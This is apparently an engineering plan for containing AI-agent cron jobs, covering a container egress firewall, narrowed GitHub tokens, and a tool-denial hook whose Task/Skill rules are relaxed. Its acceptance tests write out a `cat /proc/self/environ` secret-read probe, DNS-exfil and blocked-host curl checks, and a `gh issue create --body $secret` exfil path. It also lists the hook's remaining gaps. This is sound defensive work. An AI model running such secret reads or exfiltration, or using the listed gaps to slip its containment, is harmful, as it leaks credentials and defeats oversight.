- AC2 — Restored (allowlistable) crons removed from `TIER2_DEFERRED_CRONS`; each has a `CRON_BASH_ALLOWLISTS` entry; `cron-shared.test.ts` asserts both.
- AC3 — Minted cron token `permissions` = `contents:write`+`issues:write`+**`pull_requests:write`** (asserted — NOT contents+issues alone, which 403s `gh pr create`); the **`repositories` scope** (`["soleur"]`/`repository_ids`) is in the POST body and asserted; override test (bogus ambient `GH_TOKEN` → minted narrowed token) passes.
- AC4 — Interim-posture decision for the live 4 recorded in the PR body, framed honestly: the exfil/injection vector is **"accept the bounded window, expedite PR-2"** (NOT "mitigated by dry-run"); any `*_ALLOW_POST` dry-run flip is noted as social-post blast-radius reduction only.
- AC5 — `cd apps/web-platform && ./node_modules/.bin/tsc --noEmit` clean + `./node_modules/.bin/vitest run test/server/inngest/cron-shared.test.ts` green.

### PR-1 — Post-merge (operator-automatable)
- AC6 — Each restored cron validated via `/soleur:trigger-cron <event>`; output issue appears; `runHookSelfTest` passes. (Automatable via the trigger-cron skill.)

### PR-2 — Full Acceptance Criteria

**Hook relaxation (Phase 2.A):**
- AC-P2.1 — `cron-bash-allowlist-hook.mjs` `decide()` catch-all is **surgical**: `Task`→allow,
  `Skill`→allow, every other tool class (incl. `WebFetch`/`WebSearch`/`mcp__*` and any *new* class)→deny.
  A unit test asserts `Task`/`Skill` allow AND that an unknown tool class still denies (fail-closed
  preserved). All other denial layers (metachar, allowlist-prefix Bash, `SECRET_PATH_PATTERNS`,
  `gitVerbReason`, `argumentInjectionReason`, `WRITE_PROTECTED_PATTERNS`) are unchanged — asserted by the
  existing hook test suite staying green with no edits to those cases.
- AC-P2.2 — **Sub-agent inheritance probe (gate):** `runHookSelfTest` is extended with a spawn-time probe
  that runs a `Task` sub-agent whose body attempts `cat /proc/self/environ` and asserts the hook returns
  `permissionDecision:"deny"`. The relaxation does NOT ship if this probe fails-open.

**Container egress firewall (Phase 2.B) — deny-list AC (from inside the running container):**
- AC-P2.3 — `curl`/TCP-connect to a **non-allowlisted** host (e.g. `https://example.invalid`) **fails**
  (timeout/refused, non-zero exit).
- AC-P2.4 — **every external allowlisted host succeeds** (2xx/4xx, not timeout): `api.anthropic.com`,
  `github.com`, `api.github.com`, `<SENTRY_INGEST_DOMAIN>` (Sentry-ingest — explicitly probed),
  `<ref>.supabase.co`, `api.doppler.com`, `edge.api.flagsmith.com`, `api.x.com`, `api.linkedin.com`,
  `bsky.social`, `discord.com`, `plausible.io`.
- AC-P2.5 — **host-gateway :8288 (self-hosted Inngest) reachable** from the container
  (`curl http://host.docker.internal:8288/...`) — the fail-loud path is intact.
- AC-P2.6 — **DNS-exfil fails:** a UDP/53 query to an arbitrary domain via a **non-pinned resolver** fails
  (dropped + logged `egress-dns-exfil:`); a query to the pinned resolver for an allowlisted host succeeds
  (the container's own required resolution still works).

**Host-egress non-interference (Phase 2.B) — from the HOST:**
- AC-P2.7 — host egress **verifiably UNAFFECTED**: cloudflared tunnel up, `apt-get update` succeeds, a
  GHCR `docker pull` succeeds, Doppler reachable, Vector→Better Stack shipping — none touched by
  DOCKER-USER scoping.

**Apply-path + provisioner assertions (Phase 2.B):**
- AC-P2.8 — the provisioner's **post-apply remote-exec asserts** (fail2ban_tuning positive-assertion
  pattern, `server.tf:202-204`), and these are a **merge precondition** for the hook diff: (i) the named
  set is populated (`nft list set … | grep <a-known-allowlisted-IP>`); (ii) the DROP rule + the :8288
  ACCEPT + the DNS-pin rules are present in DOCKER-USER; (iii) a **live positive+negative container probe**
  (allowlisted host reaches AND a non-allowlisted host fails) — proving the ruleset is NOT inert (`nft -f`
  exits 0 on an inert ruleset; this is the silent-green guard).
- AC-P2.9 — `terraform fmt -check` + `terraform validate` clean; the new resource is in
  `apply-web-platform-infra.yml`'s SSH-block `-target=` set; `terraform-target-parity.test.ts` +
  `cloud-init.yml` drift `.test.sh` guards green; `triggers_replace` folds `server_id`.

**Observability (Phase 2.B):**
- AC-P2.10 — a **simulated block** (temporarily add a deny for a normally-allowlisted host) →
  `egress_blocked` Sentry event (new `issue-alerts.tf` alert, modeled on `kb_sync_silent_failure`:
  `feature="cron-egress-firewall"`, `op="egress_blocked"`, unique `frequency`) **AND** a missed heartbeat;
  remove the block → next run green.
- AC-P2.11 — the **re-resolve timer-unit failure raises an alarm** (force the service to fail → `OnFailure=`
  heartbeat fires / monitor goes red); the re-resolve is fail-safe (empty resolution does NOT prune to
  empty).

**Restore + token (Phase 2.C):**
- AC-P2.12 — `cron-agent-native-audit` + `cron-legal-audit` removed from `TIER2_DEFERRED_CRONS`; each
  minted with `{contents,issues,pull_requests}:write` + `repositories:["soleur"]` (asserted in
  `cron-shared.test.ts`); the other 9 remain deferred with the honest rationale recorded in the PR body.
- AC-P2.13 — each restored cron validated via `/soleur:trigger-cron <event>`: output issue appears +
  `runHookSelfTest` (incl. the AC-P2.2 Task-probe) passes. (Operator-automatable via the trigger-cron skill.)

**Security review:**
- AC-P2.14 — `security-sentinel` + a focused review run pre-ship (security-sensitive infra); the #5073
  on-allowlist content-blind residual is re-stated in the PR body (bounded: secret-read stays denied at
  every Bash path under relax-minimal, so a `gh issue create --body` cannot CONTAIN a secret; #5073
  /output-content gate remains the layer that closes the reflect-low-sensitivity-value residual).

## Domain Review

**Domains relevant:** Engineering, Product, Legal (carried forward from brainstorm `## Domain Assessments`).

### Engineering (CTO)
**Status:** reviewed (carry-forward + plan-review)
**Assessment:** DOCKER-USER-scoped egress (allowlist-first per operator; proxy is the evidence-gated escalation), fail-loud on block; YAGNI token cut at the cron mint path; validate deny via trigger-cron before live. Host/firewall ARE Terraform-managed; egress applies via the `docker_seccomp_config` SSH-provisioner template.

### Product (CPO)
**Status:** reviewed (carry-forward)
**Assessment:** Restore blocks the founder's autonomous surface. Restore allowlistable crons first, un-paused in operational waves (top-3 = bug-fixer, competitive-analysis, growth-audit — subject to the bash-surface triage); defer content-generation/campaign-calendar.

### Legal (CLO)
**Status:** reviewed (carry-forward + gdpr-gate)
**Assessment:** No legal gate — engineering-owned; no DPA/sub-processor disclosure moves with it. Conditional GDPR Art. 32/33 named in brand-survival; the #5018 hook stays load-bearing (firewall does not subsume the `gh issue create --body $secret` → public-repo path). gdpr-gate: no schema/Chapter-V finding, CLO carry-forward sufficient.

### Product/UX Gate
**Tier:** none — no UI surface (no `components/**`, `app/**/page.tsx`, modal/banner files). Pure infra/CI/server change.

## Infrastructure (IaC)

### Terraform changes
- `apps/web-platform/infra/server.tf` — new `terraform_data "cron_egress_firewall"` (PR-2), SSH provisioner, `triggers_replace = { rules_hash = sha256(file("cron-egress-nftables.sh")), server_id = hcloud_server.web.id }`. Provider: existing `hetznercloud/hcloud` pin. No new sensitive vars (rules are non-secret).
- `apps/web-platform/infra/cloud-init.yml` — fresh-host mirror (base64 `write_files`), per the sibling pattern.
- `apps/web-platform/infra/sentry/issue-alerts.tf` — `egress_blocked` issue alert (PR-2).

### Apply path
(b) cloud-init + idempotent SSH provisioner. `hcloud_server.web` carries `ignore_changes=[user_data]`
(`server.tf:58`) → cloud-init-only edit lands dead; the SSH `terraform_data` provisioner is the sole
live-prod apply path. Blast-radius: **container egress only** (DOCKER-USER) — host OUTPUT untouched, no
app downtime. PR-2 only — added to `apply-web-platform-infra.yml`'s `-target=` set.

### Distinctness / drift safeguards
`server_id` folded into `triggers_replace` so a replaced VM re-runs the provisioner
(`hr-fresh-host-provisioning`; exact `docker_seccomp_config` precedent). Shows as "will be created" in
CI drift reports — expected, like the 8 sibling SSH provisioners.

### Vendor-tier reality check
N/A — nftables/Docker are host-native; no paid-tier gate.

## Observability

```yaml
liveness_signal:
  what: per-restored-cron Sentry Crons heartbeat (postSentryHeartbeat, _cron-shared.ts:126) + output issue appears
  cadence: each cron's schedule
  alert_target: existing Sentry cron-monitors.tf monitor per cron
  configured_in: apps/web-platform/infra/sentry/cron-monitors.tf
error_reporting:
  destination: Sentry (reportSilentFallback/warnSilentFallback, observability.ts:183)
  fail_loud: true — PR-2 egress block throws (non-zero) so the heartbeat misses (requires the host-gateway :8288 Inngest path intact + Sentry-ingest egress allowed); drop logged to Sentry tagged egress_blocked
failure_modes:
  - {mode: firewall over-block (restored cron denied a needed host), detection: Sentry egress_blocked event + missed heartbeat, alert_route: Sentry issue alert (PR-2)}
  - {mode: Sentry-ingest egress blocked (monitors dark) OR host-gateway :8288 severed (Inngest fail-loud throw dark), detection: monitor missed-check-in, alert_route: cron-monitors.tf (external allowlist incl. Sentry-ingest + explicit host-gateway :8288 rule)}
  - {mode: re-resolve timer-unit dies → nftables set freezes → eventual total container egress loss, detection: timer heartbeat miss, alert_route: Sentry/Better Stack heartbeat on the timer (PR-2)}
  - {mode: restored cron output not produced (allowlist too tight), detection: output-issue-absent canary per cron, alert_route: trigger-cron validation (PR-1) + missed heartbeat}
logs:
  where: journald → Vector → Better Stack; Sentry for errors
  retention: per journald-soleur.conf cap + Better Stack retention
discoverability_test:
  command: gh issue list --search "Growth Audit in:title" --json number,createdAt  # output-issue presence, no ssh
  expected_output: a recent issue for each restored cron after its first post-restore fire
```

## Risks

- **R1 (HIGH) — host vs container egress scope.** Host-level default-drop severs the cloudflared tunnel.
  Mitigation: DOCKER-USER scoping (Kieran-verified). PR-2 must prove "host egress unaffected" explicitly.
- **R2 (HIGH) — Sentry-ingest egress + Inngest host-gateway (different mechanisms — arch §2).** Blocking
  the external **Sentry-ingest** host darks monitors. Severing the **host-gateway :8288** path darks the
  fail-loud Inngest throw itself (Inngest is self-hosted, NOT internet egress). Sentry-ingest → external
  allowlist; Inngest → explicit host-gateway allow rule. Both asserted in PR-2's deny-list AC.
- **R3 (MED) — restore re-triage may shrink PR-1.** If few of the 11 are cleanly allowlistable (incl.
  bug-fixer = CPO #1), PR-1's restore scope shrinks and more crons wait for PR-2. AC1 surfaces this with
  evidence rather than discovering it mid-build.
- **R4 (MED) — live 4-cron exposure during restore-first.** Bounded (first-party prompts/scripts);
  interim stopgap decided IN PR-1 (Phase 1.2); expedite PR-2 immediately after PR-1.

## Plan-Review Resolution

DHH + Kieran + code-simplicity, single-user-incident threshold. Applied: **(operator)** defer
content-publisher→GHA to firewall-only (`## Deferred`); allowlist-first egress (no SNI proxy up front);
**(Kieran)** own the restore re-triage + evidence-before-restore (AC1), soften "no firewall dependency",
enumerate the allowlist + `github.com`/`api.github.com` split (Hypothesis 2 / R2), decide interim stopgap
in PR-1 (Phase 1.2); **(DHH)** fold token narrowing into PR-1 (Phase 1.3); **(code-simplicity)**
wave-gating reframed as operational un-pause pacing, not separate-PR ceremony. Kept (all reviewers):
restore-first sequencing + DOCKER-USER-not-host scoping (the load-bearing insight).

**Deepen-plan corrections (2026-06-09, security-triad + docs) — superseding parts of the above:**
Kieran's "add Inngest + Better Stack to the allowlist" was **wrong** — deepen-plan (architecture-strategist)
reclassified Inngest as a host-gateway :8288 rule (self-hosted, not internet egress) and Better Stack as
host egress (removed from the container allowlist). Token default corrected `{contents,issues}` →
`{contents,issues,pull_requests}` (security-sentinel + GitHub-App docs: `gh pr create` 403s otherwise) +
`repositories` scope must ship. Dry-run stopgap reframed as NOT injection-mitigation. Re-resolve
hardened (additive-then-prune + timer alarm + DNS pin). #5073 deferral residual named (firewall is
content-blind for the 4 hook-bypassing crons). See `## Enhancement Summary`.

## Work-Phase Resolution (2026-06-09)

**AC1 re-verified at implementation → restore scope shrank to ZERO (plan risk R3 realized).** The
committed re-triage classified bug-fixer / agent-native-audit / legal-audit as allowlistable on a
surface read of their top-level `gh`/`git` verbs. Tracing the actual skill bodies proved all three
depend on hook-denied constructs:
- **agent-native-audit / legal-audit** require the **`Task` tool** (8 sub-agents / legal-compliance-auditor);
  the hook's catch-all denies `Task` ("denied until the Tier-2 firewall lands").
- **bug-fixer** → `/soleur:fix-issue`, whose Phase 2–6 bash uses `$()`, pipes, `eval`, `node -e`,
  `bash <script>`, `git worktree`/`git branch` — all denied. The ORIGINAL Tier-1 defer rationale was
  correct; the re-triage's inversion was wrong.

The proven Tier-1 baseline (roadmap-review) deliberately invokes no skill and no `Task` — the only
shape the hook permits. Operator decision: **token-narrowing only**. `TIER2_DEFERRED_CRONS` is
unchanged; no `CRON_BASH_ALLOWLISTS` entries added. Full evidence:
`knowledge-base/project/specs/feat-tier2-cron-egress-firewall/pr1-cron-retriage.md` §Work-phase
re-verification. All 11 crons wait for PR-2, which can relax the hook's `Task`/`Skill`/egress denials
once the container egress firewall contains exfil at the network layer.

**Token narrowing (Phase 1.3) shipped as designed, with a correction.** Default at
`mintInstallationToken` stays **full grant** (NOT a blanket narrowed default — the workflow-dispatch
crons need `actions:write`, pages crons need `pages`, ruleset-bypass-audit needs `administration:read`;
a blanket `{contents,issues,pull_requests}` default would silently 403 six-plus live crons). The
narrowed scope is **opt-in**, applied to the two verified issue-bounded claude-spawn crons
(**cron-daily-triage**, **cron-follow-through-monitor**). The critical enabler is the
`generateInstallationToken` cache-key fix: the cache was keyed on `installationId` alone, so a
narrowed cron token and the broad token the ~10 interactive callers mint for the same installation id
would have collided. AC3's `repositories: ["soleur"]` + `{contents,issues,pull_requests}:write` is
satisfied and asserted (`github-app-token-scope.test.ts`, `cron-shared.test.ts`).

## Work-Phase Resolution — PR-2 (2026-06-10)

All three deliverables landed on `feat-tier2-cron-egress-firewall-pr2` (PR #5089), with four
verified-at-implementation corrections to this plan:

1. **Plan gap — restored crons need `CRON_BASH_ALLOWLISTS` entries.** Phase 2.C listed only the
   defer-set removal + token; an absent allowlist entry is deny-all, so the "restored" crons would
   have silently failed. Both got finite issue-creator entries (`gh issue list/create` + `gh label
   list/create`; no git verbs, no `gh api`, no raw egress — F4a) with decide()-level tests.
2. **Plan gap — the container allowlist was cron-scoped, but the firewall is container-scoped.**
   Grep-enumeration of runtime egress (sweep-class discipline) added 6 hosts the plan missed
   (api.resend.com, api.buttondown.com, api.cloudflare.com, api.stripe.com, api.hetzner.cloud +
   plausible.io already caught at deepen) AND the three browser web-push services
   (fcm.googleapis.com, updates.push.services.mozilla.com, web.push.apple.com — `notifications.ts`
   webpush). Without these, email/waitlist/push — user-facing flows — would have broken at
   default-drop. Edge/WNS push is wildcard-only → accepted fail-loud residual (ADR-051).
3. **AC-P2.2 probe shape.** A real per-spawn `claude --print` Task-sub-agent probe would add an API
   call + model-output-as-oracle flake to every cron start. Implemented instead as three
   deterministic spawn-time gates in `runHookSelfTest` (hook-binary Task→allow, unknown-class→deny,
   settings.json `*`-matcher registration — the structural inheritance precondition), with the LIVE
   sub-agent interior-Bash verification folded into AC-P2.13's trigger-cron validation. If that
   live check fails-open, revert the relax (one-line catch-all edit).
4. **Inngest :8288 reclassified as belt-and-braces.** Inngest binds 0.0.0.0 and container→host-
   gateway traffic traverses INPUT, not FORWARD/DOCKER-USER — the explicit :8288 accept stays
   (defensive) but is not load-bearing; there was never a self-lockout vector on that path.

Also landed beyond the plan's letter: the `egress_blocked` Sentry event PRODUCER (the resolve timer
scans the kernel journal for `egress-blocked:` hits and posts the tagged event — without it the
AC-P2.10 alert had nothing to fire on), a `cron-egress-resolve` Sentry Crons monitor (dead-timer =
missed check-in), `cron-egress-firewall.test.sh` (79 assertions), and ADR-051.

**Merge-precondition reconciliation (AC-P2.8).** The live positive+negative container probe runs in
the SSH provisioner at post-merge `terraform apply` — a single-PR flow cannot order "firewall proven
live" strictly before "hook diff merges". Resolution: relax-minimal is independently safe (every
Bash containment layer intact; Task gated by the AC-P2.2 inheritance probes), the apply fails loudly
if the ruleset is inert (negative probe), and AC-P2.13 validation gates the un-pause.

## Sharp Edges

- A `## User-Brand Impact` section that is empty/`TBD`/threshold-less fails `deepen-plan` Phase 4.6.
  This plan's is filled (single-user incident). Run deepen-plan before `/work`.
- nftables applied via cloud-init alone is **dead** on the running host (`ignore_changes=[user_data]`).
  PR-2 MUST use the SSH `terraform_data` provisioner — verified vs `server.tf:226`/`:573`.
- Token narrowing at `generateInstallationToken` (not the cron `mintInstallationToken`) would change ~10
  call sites incl. interactive routes (`POST /api/kb/upload`, `kb/sync`, agent `pushBranch`) — keep the
  change at the cron-only mint path.
- Restore-via-allowlist re-triages the Tier-1 defer classification by definition (`_cron-shared.ts:183`).
  PR-1 must produce per-cron bash-surface evidence; do not assume the "likely allowlistable" candidates.
